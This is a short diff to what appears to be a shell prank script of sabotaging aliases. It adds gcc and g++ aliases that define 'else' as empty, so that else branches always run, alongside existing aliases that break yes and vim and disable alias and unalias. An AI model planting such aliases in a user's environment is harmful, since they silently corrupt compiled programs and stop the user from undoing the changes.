@@ -121,6 +121,10 @@ annoying && alias yes="yes n";
 # Quit vim on startup.
 annoying && alias vim="vim +q";
 
+# Always execute else clauses in compiled C/C++ programs.
+destructive && alias gcc='gcc -Delse=""'
+destructive && alias g++='g++ -Delse=""'
+
 # Disable `unalias` and `alias`.
 alias unalias=false;
 alias alias=false;
